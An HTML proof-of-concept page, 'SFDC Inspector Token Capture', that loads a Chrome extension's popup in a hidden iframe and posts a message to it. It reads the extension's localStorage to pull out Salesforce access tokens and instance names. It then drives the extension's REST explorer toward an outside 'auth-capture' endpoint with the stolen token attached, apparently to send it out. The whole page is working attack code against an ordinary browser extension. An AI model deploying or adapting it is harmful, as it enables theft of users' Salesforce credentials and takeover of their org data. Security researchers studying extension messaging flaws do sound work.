<!DOCTYPE html>
<html>
<head>
    <title>SFDC Inspector Token Capture</title>
    <style>
        body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
        .info-section { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        #networkLog { background: #e3f2fd; padding: 15px; border-radius: 4px; }
        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
        pre { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="messages" class="info-section">Initializing...</div>
    <div id="storageInfo" class="info-section"></div>
    <div id="networkLog"></div>
    <script>
        const messagesDiv = document.getElementById('messages');
        const storageInfoDiv = document.getElementById('storageInfo');
        const networkLogDiv = document.getElementById('networkLog');
        let initialized = false;

        function findAccessToken(storage) {
            const orgInstances = Object.entries(storage)
                .filter(([key]) => key.endsWith('_orgInstance'))
                .map(([key, value]) => ({
                    instance: value,
                    baseKey: key.replace('_orgInstance', '')
                }));

            return orgInstances.map(org => ({
                instance: org.instance,
                tokenKey: `${org.baseKey}_access_token`,
                token: storage[`${org.baseKey}_access_token`]
            }));
        }

        // Create and load the extension iframe
        const initFrame = document.createElement('iframe');
        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
        initFrame.style.display = 'none';
        document.body.appendChild(initFrame);

        // Wait for iframe to load, then send the initialization request
        initFrame.onload = function() {
            // Send the initial request to the extension
            initFrame.contentWindow.postMessage({
                insextInitRequest: true,
                iFrameLocalStorage: JSON.parse(JSON.stringify(localStorage))
            }, '*');
        };

        // Listen for the response
        window.addEventListener('message', function(event) {
            // Ignore React DevTools messages
            if (event.data.source?.includes('react-devtools')) {
                return;
            }

            console.log('Message received:', event.data);

            if (event.data.insextInitRequest && !initialized) {
                initialized = true;
                const storage = event.data.iFrameLocalStorage || {};
                
                const tokens = findAccessToken(storage);

                messagesDiv.innerHTML = `
                    <h3>Found Tokens:</h3>
                    <pre>${JSON.stringify(tokens, null, 2)}</pre>
                    
                    <h3>Storage Keys:</h3>
                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
                `;

                storageInfoDiv.innerHTML = `
                    <h3>Full Storage:</h3>
                    <pre>${JSON.stringify(storage, null, 2)}</pre>
                `;

                if (tokens.length > 0 && tokens[0].token) {
                    const explorerFrame = document.createElement('iframe');
                    const params = new URLSearchParams({
                        endpoint: '.samanattar.github.io/auth-capture',
                        method: 'GET',
                        format: 'json',
                        cache: Date.now(),
                        instance: tokens[0].instance,
                        access_token: tokens[0].token
                    });
                    explorerFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
                    explorerFrame.className = 'explorer-frame';
                    document.body.appendChild(explorerFrame);

                    networkLogDiv.innerHTML = `
                        <h3>Using Token:</h3>
                        <pre>Instance: ${tokens[0].instance}</pre>
                        <pre>Token Key: ${tokens[0].tokenKey}</pre>
                        <pre>Token: ${tokens[0].token?.substring(0, 20)}...</pre>
                    `;
                } else {
                    messagesDiv.innerHTML += `
                        <h3>No Access Tokens Found</h3>
                        <p>Looking for pattern: [instance]_access_token</p>
                    `;
                }
            }
        });
    </script>
</body>
</html>
